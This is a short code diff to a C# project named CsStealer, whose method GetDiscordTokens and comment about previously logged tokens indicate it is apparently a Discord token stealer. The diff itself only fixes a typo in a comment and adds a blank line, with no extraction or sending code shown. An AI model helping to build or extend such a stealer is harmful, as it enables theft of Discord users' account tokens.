@@ -10,7 +10,7 @@ namespace CsStealer
     {
         public static async Task GetDiscordTokens()
         {
-            // This array is temporary, i plan to add a feature that checks if the tokens where already logged in the past
+            // This array is temporary, i plan to add a feature that checks if the tokens were already logged in the past
 
             string[] oldTokens = Array.Empty<string>();
             await ProcessTokens(oldTokens);
@@ -191,4 +191,5 @@ namespace CsStealer
             }
         }
     }
+
 }
